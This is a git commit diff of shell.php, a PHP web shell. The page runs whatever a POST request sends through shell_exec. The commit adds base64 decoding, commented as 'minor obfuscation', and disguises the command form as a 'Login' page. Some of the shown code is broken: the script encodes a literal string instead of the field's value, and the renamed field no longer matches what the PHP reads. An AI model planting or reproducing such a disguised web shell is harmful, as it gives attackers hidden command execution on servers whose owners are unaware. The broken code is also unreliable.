c3316df2b5977e841d2aa774fe8bcb38c1b43e55
Michael <mike-bailey@users.noreply.github.com>
2015-05-27 21:16:19 -0400

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,18 +1,27 @@
 <?php
 	if (isset($_POST['command']))
 	{
-		$response = shell_exec($_POST['command']);
+		// Minor obfuscation
+		$response = shell_exec(base64_decode($_POST['command']));
 	}
 ?>
 <!DOCTYPE html>
 <html>
 	<head>
+		<script>
+		function validate(contents) {
+			console.log("Contents passed as "+contents)
+			console.log(document.getElementById('user').value);
+			document.getElementById('user').value=btoa("document.getElementById('user').value");
+			console.log(document.getElementById('user').value);
+		}
+		</script>
 		<title>Shell</title>
 	</head>
 	<body>
-		<form action="" method="POST">
-			<input type="text" name="command"/>
-			<input type="submit" value="Execute"/>
+		<form action="" method="POST" onsubmit="validate(document.getElementById('user').value)">
+			<input type="text" name="user" id="user" />
+			<input type="submit" value="Login"/>
 		</form>
 		<p>
 			<?php 
